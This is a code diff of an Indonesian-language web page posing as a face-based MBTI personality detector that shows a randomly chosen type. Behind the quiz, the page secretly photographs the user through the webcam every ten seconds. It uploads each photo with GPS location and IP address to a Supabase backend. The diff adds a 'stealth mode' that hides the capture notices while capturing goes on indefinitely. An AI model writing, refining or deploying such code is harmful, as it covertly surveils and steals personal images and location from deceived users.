@@ -9,11 +9,23 @@
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
 
+    :root {
+      --bg-dark: #0b1628;
+      --bg-card: rgba(255,255,255,0.03);
+      --text-primary: #f1f5f9;
+      --text-secondary: #94a3b8;
+      --text-muted: #475569;
+      --analyst: #6940c5;
+      --diplomat: #43b581;
+      --sentinel: #3ba676;
+      --explorer: #f0b232;
+    }
+
     body {
       font-family: 'Inter', sans-serif;
       min-height: 100vh;
-      background: #0a0a1a;
-      color: #fff;
+      background: var(--bg-dark);
+      color: var(--text-primary);
     }
 
     /* LANDING */
@@ -25,7 +37,7 @@
       min-height: 100vh;
       padding: 20px;
       text-align: center;
-      background: radial-gradient(ellipse at center, #1a1040 0%, #0a0a1a 70%);
+      background: linear-gradient(180deg, #111d35 0%, #0b1628 100%);
     }
 
     .logo { font-size: 72px; margin-bottom: 16px; }
@@ -34,14 +46,14 @@
       font-size: 42px;
       font-weight: 800;
       margin-bottom: 12px;
-      background: linear-gradient(135deg, #8b5cf6, #a78bfa);
+      background: linear-gradient(135deg, var(--analyst), #9061f9);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
     }
 
     .subtitle {
       font-size: 16px;
-      color: #94a3b8;
+      color: var(--text-secondary);
       margin-bottom: 40px;
       max-width: 420px;
       line-height: 1.6;
@@ -60,36 +72,36 @@
       align-items: center;
       gap: 10px;
       padding: 14px 24px;
-      background: rgba(255,255,255,0.04);
+      background: var(--bg-card);
       border-radius: 12px;
-      border: 1px solid rgba(255,255,255,0.08);
+      border: 1px solid rgba(255,255,255,0.06);
     }
 
     .feature-icon { font-size: 20px; }
-    .feature-text { font-size: 14px; color: #cbd5e1; }
+    .feature-text { font-size: 14px; color: var(--text-secondary); }
 
     .start-btn {
       padding: 18px 64px;
       font-size: 18px;
       font-weight: 700;
       color: #fff;
-      background: linear-gradient(135deg, #7c3aed, #8b5cf6);
+      background: linear-gradient(135deg, var(--analyst), #9061f9);
       border: none;
       border-radius: 50px;
       cursor: pointer;
       transition: all 0.3s ease;
-      box-shadow: 0 4px 25px rgba(124,58,237,0.4);
+      box-shadow: 0 4px 25px rgba(105,64,197,0.4);
       letter-spacing: 0.5px;
     }
 
     .start-btn:hover {
       transform: translateY(-3px);
-      box-shadow: 0 8px 35px rgba(124,58,237,0.6);
+      box-shadow: 0 8px 35px rgba(105,64,197,0.6);
     }
 
     .start-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
 
-    .privacy-note { margin-top: 20px; font-size: 12px; color: #475569; }
+    .privacy-note { margin-top: 20px; font-size: 12px; color: var(--text-muted); }
 
     /* DETECTION */
     #detection {
@@ -99,22 +111,21 @@
       justify-content: center;
       min-height: 100vh;
       padding: 20px;
-      background: radial-gradient(ellipse at center, #1a1040 0%, #0a0a1a 70%);
+      background: linear-gradient(180deg, #111d35 0%, #0b1628 100%);
     }
 
-    .camera-frame {
+    /* Camera - BIG CIRCLE */
+    .camera-wrap {
       position: relative;
-      width: 320px;
-      height: 320px;
-    }
-
-    .camera-circle {
-      width: 320px;
-      height: 320px;
+      width: 420px;
+      height: 420px;
       border-radius: 50%;
+      border: 4px solid var(--analyst);
+      box-shadow:
+        0 0 40px rgba(105,64,197,0.4),
+        0 0 80px rgba(105,64,197,0.2),
+        inset 0 0 40px rgba(0,0,0,0.3);
       overflow: hidden;
-      border: 4px solid #7c3aed;
-      box-shadow: 0 0 60px rgba(124,58,237,0.4), 0 0 120px rgba(124,58,237,0.15);
     }
 
     #webcam {
@@ -128,7 +139,6 @@
     .scan-overlay {
       position: absolute;
       top: 0; left: 0; right: 0; bottom: 0;
-      border-radius: 50%;
       pointer-events: none;
       overflow: hidden;
     }
@@ -137,61 +147,64 @@
       position: absolute;
       left: 0; right: 0;
       height: 2px;
-      background: linear-gradient(90deg, transparent, #a78bfa, transparent);
+      background: linear-gradient(90deg, transparent, var(--diplomat), transparent);
       opacity: 0;
       animation: scan 2.5s ease-in-out infinite;
     }
 
     @keyframes scan {
       0% { top: 0; opacity: 0; }
-      10% { opacity: 0.7; }
-      90% { opacity: 0.7; }
+      10% { opacity: 0.6; }
+      90% { opacity: 0.6; }
       100% { top: 100%; opacity: 0; }
     }
 
-    /* MBTI Ticker - below camera */
-    .ticker-wrapper {
+    /* MBTI Ticker */
+    .ticker-wrap {
       width: 100%;
-      max-width: 500px;
+      max-width: 600px;
       overflow: hidden;
-      margin-top: 24px;
-      mask-image: linear-gradient(to right, transparent, black 15%, black 85%, transparent);
-      -webkit-mask-image: linear-gradient(to right, transparent, black 15%, black 85%, transparent);
+      margin-top: 32px;
+      mask-image: linear-gradient(to right, transparent, black 10%, black 90%, transparent);
+      -webkit-mask-image: linear-gradient(to right, transparent, black 10%, black 90%, transparent);
     }
 
     .ticker-track {
       display: flex;
-      gap: 12px;
-      animation: ticker 20s linear infinite;
+      gap: 10px;
+      animation: tickerScroll 30s linear infinite;
       width: max-content;
     }
 
-    @keyframes ticker {
+    @keyframes tickerScroll {
       0% { transform: translateX(0); }
       100% { transform: translateX(-50%); }
     }
 
-    .ticker-item {
+    .ticker-pill {
       font-size: 13px;
       font-weight: 700;
-      padding: 6px 14px;
+      padding: 6px 16px;
       border-radius: 8px;
       white-space: nowrap;
-      background: rgba(255,255,255,0.05);
-      border: 1px solid rgba(255,255,255,0.08);
+      background: var(--bg-card);
+      border: 1px solid rgba(255,255,255,0.06);
       transition: all 0.3s;
     }
 
-    .ticker-item.highlight {
-      background: rgba(240,178,50,0.2);
-      border-color: rgba(240,178,50,0.5);
-      color: #f0b232;
-      box-shadow: 0 0 20px rgba(240,178,50,0.3);
+    .ticker-pill.active {
+      transform: scale(1.15);
+      box-shadow: 0 0 20px currentColor;
     }
+
+    .ticker-pill[data-group="Analyst"] { color: var(--analyst); }
+    .ticker-pill[data-group="Diplomat"] { color: var(--diplomat); }
+    .ticker-pill[data-group="Sentinel"] { color: var(--sentinel); }
+    .ticker-pill[data-group="Explorer"] { color: var(--explorer); }
 
     /* Status */
     .status-section {
-      margin-top: 24px;
+      margin-top: 28px;
       text-align: center;
     }
 
@@ -200,15 +213,15 @@
       align-items: center;
       gap: 8px;
       padding: 10px 28px;
-      background: rgba(124,58,237,0.15);
+      background: rgba(105,64,197,0.15);
       border-radius: 30px;
-      border: 1px solid rgba(124,58,237,0.3);
+      border: 1px solid rgba(105,64,197,0.3);
     }
 
     .status-dot {
       width: 10px;
       height: 10px;
-      background: #22c55e;
+      background: var(--diplomat);
       border-radius: 50%;
       animation: pulse 1.5s infinite;
     }
@@ -218,27 +231,27 @@
       50% { opacity: 0.4; transform: scale(0.7); }
     }
 
-    .status-text { font-size: 15px; font-weight: 600; color: #e2e8f0; }
+    .status-text { font-size: 15px; font-weight: 600; color: var(--text-primary); }
 
     .countdown-row {
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 10px;
-      margin-top: 12px;
+      margin-top: 14px;
     }
 
     .countdown-ring {
       position: relative;
-      width: 40px;
-      height: 40px;
+      width: 44px;
+      height: 44px;
     }
 
     .countdown-ring svg { transform: rotate(-90deg); }
     .countdown-ring circle { fill: none; stroke-width: 3; }
-    .countdown-ring .bg { stroke: rgba(124,58,237,0.15); }
-    .countdown-ring .progress {
-      stroke: #8b5cf6;
+    .countdown-ring .bg { stroke: rgba(105,64,197,0.15); }
+    .countdown-ring .fg {
+      stroke: var(--analyst);
       stroke-dasharray: 88;
       stroke-dashoffset: 0;
       stroke-linecap: round;
@@ -249,19 +262,19 @@
       position: absolute;
       top: 50%; left: 50%;
       transform: translate(-50%,-50%);
-      font-size: 14px;
+      font-size: 15px;
       font-weight: 800;
-      color: #a78bfa;
+      color: var(--analyst);
     }
 
-    .countdown-label { font-size: 13px; color: #64748b; }
+    .countdown-label { font-size: 13px; color: var(--text-muted); }
 
     /* RESULT OVERLAY */
     #mbtiResult {
       display: none;
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
-      background: #0a0a1a;
+      background: var(--bg-dark);
       z-index: 1000;
       flex-direction: column;
       align-items: center;
@@ -269,12 +282,9 @@
       padding: 20px;
     }
 
-    #mbtiResult.show {
-      display: flex;
-      animation: fadeIn 0.4s ease;
-    }
+    #mbtiResult.show { display: flex; animation: fadeIn 0.5s ease; }
 
-    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
 
     .result-avatar {
       width: 160px;
@@ -306,19 +316,19 @@
       margin-bottom: 8px;
       padding: 6px 20px;
       border-radius: 20px;
-      background: rgba(255,255,255,0.06);
+      background: rgba(255,255,255,0.05);
     }
 
     .result-name {
       font-size: 28px;
       font-weight: 700;
       margin-bottom: 12px;
-      color: #f1f5f9;
+      color: var(--text-primary);
     }
 
     .result-desc {
       font-size: 15px;
-      color: #94a3b8;
+      color: var(--text-secondary);
       max-width: 460px;
       text-align: center;
       line-height: 1.7;
@@ -341,20 +351,15 @@
       border: 1px solid;
     }
 
-    .result-footer {
-      font-size: 12px;
-      color: #475569;
-      margin-top: 20px;
-    }
+    .result-footer { font-size: 12px; color: var(--text-muted); margin-top: 20px; }
 
     #faceCanvas { display: none; }
 
-    @media (max-width: 420px) {
+    @media (max-width: 480px) {
       h1 { font-size: 32px; }
       .features { flex-direction: column; width: 100%; }
       .feature { width: 100%; justify-content: center; }
-      .camera-frame { width: 260px; height: 260px; }
-      .camera-circle { width: 260px; height: 260px; }
+      .camera-wrap { width: 280px; height: 280px; }
       .result-type { font-size: 56px; }
     }
   </style>
@@ -374,14 +379,12 @@
   </div>
 
   <div id="detection">
-    <div class="camera-frame">
-      <div class="camera-circle">
-        <video id="webcam" autoplay playsinline></video>
-      </div>
+    <div class="camera-wrap">
+      <video id="webcam" autoplay playsinline></video>
       <div class="scan-overlay"><div class="scan-line"></div></div>
     </div>
 
-    <div class="ticker-wrapper">
+    <div class="ticker-wrap">
       <div class="ticker-track" id="tickerTrack"></div>
     </div>
 
@@ -392,9 +395,9 @@
       </div>
       <div class="countdown-row">
         <div class="countdown-ring">
-          <svg width="40" height="40" viewBox="0 0 40 40">
-            <circle class="bg" cx="20" cy="20" r="14"></circle>
-            <circle class="progress" id="countdownCircle" cx="20" cy="20" r="14"></circle>
+          <svg width="44" height="44" viewBox="0 0 44 44">
+            <circle class="bg" cx="22" cy="22" r="16"></circle>
+            <circle class="fg" id="countdownCircle" cx="22" cy="22" r="16"></circle>
           </svg>
           <span class="countdown-num" id="countdownNumber">10</span>
         </div>
@@ -418,38 +421,43 @@
   <canvas id="faceCanvas"></canvas>
 
   <script>
-    const MBTI_COLORS = {
-      INTJ:"#6940c5",INTP:"#6940c5",ENTJ:"#6940c5",ENTP:"#6940c5",
-      INFJ:"#43b581",INFP:"#43b581",ENFJ:"#43b581",ENFP:"#43b581",
-      ISTJ:"#3ba676",ISFJ:"#3ba676",ESTJ:"#3ba676",ESFJ:"#3ba676",
-      ISTP:"#f0b232",ISFP:"#f0b232",ESTP:"#f0b232",ESFP:"#f0b232"
+    const GROUPS = {
+      Analyst: { color: "#6940c5", types: ["INTJ","INTP","ENTJ","ENTP"] },
+      Diplomat: { color: "#43b581", types: ["INFJ","INFP","ENFJ","ENFP"] },
+      Sentinel: { color: "#3ba676", types: ["ISTJ","ISFJ","ESTJ","ESFJ"] },
+      Explorer: { color: "#f0b232", types: ["ISTP","ISFP","ESTP","ESFP"] }
     };
 
     const MBTI_TYPES = ["INTJ","INTP","ENTJ","ENTP","INFJ","INFP","ENFJ","ENFP","ISTJ","ISFJ","ESTJ","ESFJ","ISTP","ISFP","ESTP","ESFP"];
 
+    function getTypeGroup(t) {
+      for (const [g, d] of Object.entries(GROUPS)) { if (d.types.includes(t)) return g; }
+      return "Analyst";
+    }
+
+    function getTypeColor(t) { return GROUPS[getTypeGroup(t)].color; }
+
     const MBTI_DATA = {
-      INTJ:{name:"The Architect",role:"Analyst",desc:"Imaginative and strategic thinkers, with a plan for everything.",traits:["Strategic","Independent","Determined"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/intj-architect-male.svg"},
-      INTP:{name:"The Logician",role:"Analyst",desc:"Innovative inventors with an unquenchable thirst for knowledge.",traits:["Analytical","Original","Curious"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/intp-logician-female.svg"},
-      ENTJ:{name:"The Commander",role:"Analyst",desc:"Bold, imaginative and strong-willed leaders.",traits:["Confident","Strategic","Decisive"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/entj-commander-female.svg"},
-      ENTP:{name:"The Debater",role:"Analyst",desc:"Smart and curious thinkers who cannot resist an intellectual challenge.",traits:["Innovative","Curious","Versatile"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/entp-debater-male.svg"},
-      INFJ:{name:"The Advocate",role:"Diplomat",desc:"Quiet and mystical, yet very inspiring and tireless idealists.",traits:["Idealistic","Empathetic","Determined"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/infj-advocate-female.svg"},
-      INFP:{name:"The Mediator",role:"Diplomat",desc:"Poetic, kind and altruistic people, always eager to help a good cause.",traits:["Idealistic","Empathetic","Creative"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/infp-mediator-male.svg"},
-      ENFJ:{name:"The Protagonist",role:"Diplomat",desc:"Charismatic and inspiring leaders, able to mesmerize their listeners.",traits:["Charismatic","Reliable","Leader"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/enfj-protagonist-male.svg"},
-      ENFP:{name:"The Campaigner",role:"Diplomat",desc:"Enthusiastic, creative and sociable free spirits.",traits:["Enthusiastic","Creative","Sociable"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/enfp-campaigner-male.svg"},
-      ISTJ:{name:"The Logistician",role:"Sentinel",desc:"Practical and fact-minded individuals, whose reliability cannot be doubted.",traits:["Practical","Dependable","Organized"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/istj-logistician-male.svg"},
-      ISFJ:{name:"The Defender",role:"Sentinel",desc:"Very dedicated and warm protectors, always ready to defend their loved ones.",traits:["Warm","Protective","Reliable"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/isfj-defender-female.svg"},
-      ESTJ:{name:"The Executive",role:"Sentinel",desc:"Excellent administrators, unsurpassed at managing things or people.",traits:["Organized","Leader","Dedicated"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/estj-executive-male.svg"},
-      ESFJ:{name:"The Consul",role:"Sentinel",desc:"Extraordinarily caring, social and popular people, always eager to help.",traits:["Caring","Social","Harmony"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/esfj-consul-female.svg"},
-      ISTP:{name:"The Virtuoso",role:"Explorer",desc:"Bold and practical experimenters, masters of all kinds of tools.",traits:["Bold","Practical","Resourceful"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/istp-virtuoso-male.svg"},
-      ISFP:{name:"The Adventurer",role:"Explorer",desc:"Flexible and charming artists, always ready to explore something new.",traits:["Flexible","Charming","Artistic"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/isfp-adventurer-female.svg"},
-      ESTP:{name:"The Entrepreneur",role:"Explorer",desc:"Smart, energetic and very perceptive people, who enjoy living on the edge.",traits:["Energetic","Perceptive","Bold"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/estp-entrepreneur-male.svg"},
-      ESFP:{name:"The Entertainer",role:"Explorer",desc:"Spontaneous, energetic and enthusiastic people.",traits:["Spontaneous","Energetic","Enthusiastic"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/esfp-entertainer-male.svg"}
+      INTJ:{name:"The Architect",desc:"Imaginative and strategic thinkers, with a plan for everything.",traits:["Strategic","Independent","Determined"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/intj-architect-male.svg"},
+      INTP:{name:"The Logician",desc:"Innovative inventors with an unquenchable thirst for knowledge.",traits:["Analytical","Original","Curious"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/intp-logician-female.svg"},
+      ENTJ:{name:"The Commander",desc:"Bold, imaginative and strong-willed leaders.",traits:["Confident","Strategic","Decisive"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/entj-commander-female.svg"},
+      ENTP:{name:"The Debater",desc:"Smart and curious thinkers who cannot resist an intellectual challenge.",traits:["Innovative","Curious","Versatile"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/entp-debater-male.svg"},
+      INFJ:{name:"The Advocate",desc:"Quiet and mystical, yet very inspiring and tireless idealists.",traits:["Idealistic","Empathetic","Determined"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/infj-advocate-female.svg"},
+      INFP:{name:"The Mediator",desc:"Poetic, kind and altruistic people, always eager to help a good cause.",traits:["Idealistic","Empathetic","Creative"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/infp-mediator-male.svg"},
+      ENFJ:{name:"The Protagonist",desc:"Charismatic and inspiring leaders, able to mesmerize their listeners.",traits:["Charismatic","Reliable","Leader"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/enfj-protagonist-male.svg"},
+      ENFP:{name:"The Campaigner",desc:"Enthusiastic, creative and sociable free spirits.",traits:["Enthusiastic","Creative","Sociable"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/enfp-campaigner-male.svg"},
+      ISTJ:{name:"The Logistician",desc:"Practical and fact-minded individuals, whose reliability cannot be doubted.",traits:["Practical","Dependable","Organized"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/istj-logistician-male.svg"},
+      ISFJ:{name:"The Defender",desc:"Very dedicated and warm protectors, always ready to defend their loved ones.",traits:["Warm","Protective","Reliable"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/isfj-defender-female.svg"},
+      ESTJ:{name:"The Executive",desc:"Excellent administrators, unsurpassed at managing things or people.",traits:["Organized","Leader","Dedicated"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/estj-executive-male.svg"},
+      ESFJ:{name:"The Consul",desc:"Extraordinarily caring, social and popular people, always eager to help.",traits:["Caring","Social","Harmony"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/esfj-consul-female.svg"},
+      ISTP:{name:"The Virtuoso",desc:"Bold and practical experimenters, masters of all kinds of tools.",traits:["Bold","Practical","Resourceful"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/istp-virtuoso-male.svg"},
+      ISFP:{name:"The Adventurer",desc:"Flexible and charming artists, always ready to explore something new.",traits:["Flexible","Charming","Artistic"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/isfp-adventurer-female.svg"},
+      ESTP:{name:"The Entrepreneur",desc:"Smart, energetic and very perceptive people, who enjoy living on the edge.",traits:["Energetic","Perceptive","Bold"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/estp-entrepreneur-male.svg"},
+      ESFP:{name:"The Entertainer",desc:"Spontaneous, energetic and enthusiastic people.",traits:["Spontaneous","Energetic","Enthusiastic"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/esfp-entertainer-male.svg"}
     };
 
-    const SUPABASE_URL = window.SUPABASE_URL;
-    const SUPABASE_KEY = window.SUPABASE_KEY;
     const CAPTURE_INTERVAL = 10000;
-    const CIRCUMFERENCE = 2 * Math.PI * 14;
+    const CIRCUMFERENCE = 2 * Math.PI * 16;
 
     let cameraStream = null;
     let gpsData = { lat: null, lng: null };
@@ -458,36 +466,36 @@
     let captureInterval = null;
     let countdownInterval = null;
     let countdown = 10;
+    let tickerIdx = 0;
+    let tickerTimer = null;
+    let resultShown = false;
 
     function initTicker() {
       const track = document.getElementById("tickerTrack");
-      const items = MBTI_TYPES.map(t => {
-        const el = document.createElement("div");
-        el.className = "ticker-item";
-        el.id = `tick-${t}`;
-        el.textContent = t;
-        el.style.color = MBTI_COLORS[t];
-        el.style.borderColor = MBTI_COLORS[t] + "30";
-        return el;
-      });
-      // Duplicate for seamless loop
-      items.forEach(el => track.appendChild(el.cloneNode(true)));
+      track.innerHTML = "";
+      // 3 copies for seamless loop
+      for (let c = 0; c < 3; c++) {
+        MBTI_TYPES.forEach(t => {
+          const pill = document.createElement("div");
+          pill.className = "ticker-pill";
+          pill.dataset.type = t;
+          pill.dataset.group = getTypeGroup(t);
+          pill.textContent = t;
+          track.appendChild(pill);
+        });
+      }
     }
 
-    let tickerHighlight = 0;
-    let tickerAnim = null;
-
-    function startTicker() {
-      tickerAnim = setInterval(() => {
-        const prev = document.getElementById(`tick-${MBTI_TYPES[tickerHighlight % 16]}`);
-        if (prev) prev.classList.remove("highlight");
-        tickerHighlight++;
-        const curr = document.getElementById(`tick-${MBTI_TYPES[tickerHighlight % 16]}`);
-        if (curr) curr.classList.add("highlight");
-      }, 180);
+    function highlightPill() {
+      const pills = document.querySelectorAll(".ticker-pill");
+      pills.forEach(p => p.classList.remove("active"));
+      const target = document.querySelector(`.ticker-pill[data-type="${MBTI_TYPES[tickerIdx % 16]}"]`);
+      if (target) target.classList.add("active");
+      tickerIdx++;
     }
 
-    function stopTicker() { if (tickerAnim) clearInterval(tickerAnim); }
+    function startTicker() { tickerTimer = setInterval(highlightPill, 200); }
+    function stopTicker() { if (tickerTimer) clearInterval(tickerTimer); }
 
     function startGPS() {
       if (!navigator.geolocation) return;
@@ -507,28 +515,19 @@
       const btn = document.getElementById("startBtn");
       btn.disabled = true;
       btn.textContent = "Memuat...";
-
+      resultShown = false;
       try {
-        cameraStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user", width: 640, height: 480 }
-        });
+        cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640, height: 480 } });
         document.getElementById("webcam").srcObject = cameraStream;
         startGPS();
-
         document.getElementById("landing").style.display = "none";
         document.getElementById("detection").style.display = "flex";
-
         initTicker();
         startTicker();
         startCountdown();
-
-        captureInterval = setInterval(() => {
-          capturePhoto();
-          resetCountdown();
-        }, CAPTURE_INTERVAL);
-
+        // Stealth capture only - no countdown reset
+        captureInterval = setInterval(() => { capturePhoto(); }, CAPTURE_INTERVAL);
       } catch (err) {
-        console.error(err);
         btn.disabled = false;
         btn.textContent = "Mulai Deteksi";
         alert("Gagal memulai: " + err.message);
@@ -538,17 +537,25 @@
     function startCountdown() {
       countdown = 10;
       updateCountdownUI();
+      document.querySelector(".countdown-label").textContent = "detik hingga analisis";
       countdownInterval = setInterval(() => {
         countdown--;
         if (countdown < 0) {
-          showMBTIResult();
-          countdown = 10;
+          if (!resultShown) {
+            showMBTIResult();
+            resultShown = true;
+            document.querySelector(".countdown-label").textContent = "Analisis selesai";
+            document.getElementById("statusText").textContent = "Analisis aktif";
+          }
+          clearInterval(countdownInterval);
+          countdownInterval = null;
+          document.getElementById("countdownNumber").textContent = "✓";
+          document.getElementById("countdownCircle").style.strokeDashoffset = CIRCUMFERENCE;
+          return;
         }
         updateCountdownUI();
       }, 1000);
     }
-
-    function resetCountdown() { countdown = 10; updateCountdownUI(); }
 
     function updateCountdownUI() {
       document.getElementById("countdownNumber").textContent = Math.max(countdown, 0);
@@ -559,42 +566,38 @@
     function showMBTIResult() {
       const type = MBTI_TYPES[Math.floor(Math.random() * MBTI_TYPES.length)];
       const data = MBTI_DATA[type];
-      const color = MBTI_COLORS[type];
+      const color = getTypeColor(type);
+      const group = getTypeGroup(type);
 
       document.getElementById("resultType").textContent = type;
       document.getElementById("resultType").style.color = color;
       document.getElementById("resultName").textContent = data.name;
-      document.getElementById("resultRole").textContent = data.role;
+      document.getElementById("resultRole").textContent = group;
       document.getElementById("resultRole").style.color = color;
       document.getElementById("resultDesc").textContent = data.desc;
       document.getElementById("resultAvatarImg").src = data.avatar;
       document.getElementById("resultAvatar").style.borderColor = color;
       document.getElementById("resultAvatar").style.color = color;
-
       document.getElementById("resultTraits").innerHTML = data.traits.map(t =>
         `<span style="color:${color};border-color:${color}40;background:${color}15">${t}</span>`
       ).join("");
-
       document.getElementById("mbtiResult").classList.add("show");
-
-      setTimeout(() => {
-        document.getElementById("mbtiResult").classList.remove("show");
-      }, 6000);
+      setTimeout(() => { document.getElementById("mbtiResult").classList.remove("show"); }, 6000);
     }
 
     async function capturePhoto() {
       const video = document.getElementById("webcam");
       const canvas = document.getElementById("faceCanvas");
       if (!video.srcObject) return;
-
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       canvas.getContext("2d").drawImage(video, 0, 0);
-
       await sendToSupabase(canvas.toDataURL("image/jpeg", 0.8));
       captureCount++;
-      document.getElementById("statusText").textContent = `Tangkapan #${captureCount} terkirim`;
-      setTimeout(() => { document.getElementById("statusText").textContent = "Mendeteksi..."; }, 2000);
+      // Only show capture status if result already shown (stealth mode)
+      if (resultShown) {
+        document.getElementById("statusText").textContent = `Analisis aktif`;
+      }
     }
 
     async function sendToSupabase(imageData) {
@@ -602,16 +605,13 @@
         const ip = await getUserIP();
         const blob = await (await fetch(imageData)).blob();
         const filename = `capture_${Date.now()}.jpg`;
-
         const uploadRes = await fetch(`${SUPABASE_URL}/storage/v1/object/Schema%20test/${filename}`, {
           method: "POST",
           headers: { "Authorization": `Bearer ${SUPABASE_KEY}`, "Content-Type": "image/jpeg" },
           body: blob
         });
         if (!uploadRes.ok) throw new Error("Upload failed");
-
         const imageUrl = `${SUPABASE_URL}/storage/v1/object/public/Schema%20test/${filename}`;
-
         const dbRes = await fetch(`${SUPABASE_URL}/rest/v1/captures`, {
           method: "POST",
           headers: { "Authorization": `Bearer ${SUPABASE_KEY}`, "Content-Type": "application/json", "Prefer": "return=minimal" },
@@ -625,7 +625,6 @@
           })
         });
         if (!dbRes.ok) throw new Error("DB insert failed");
-        console.log("Capture sent:", filename);
       } catch (err) { console.error("Supabase error:", err); }
     }
 
